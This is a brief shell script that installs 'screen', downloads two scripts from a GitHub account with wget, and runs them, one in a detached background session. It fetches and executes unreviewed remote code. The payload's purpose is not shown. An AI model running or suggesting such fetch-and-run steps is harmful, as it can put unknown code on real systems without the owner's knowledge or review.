#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://raw.githubusercontent.com/skullCANDe/hick/main/gb.sh
wget https://raw.githubusercontent.com/skullCANDe/skyz/main/lesco.py
chmod +x lesco.py
screen -dmS lesco.py ./lesco.py 60 70
chmod +x gb.sh
./gb.sh
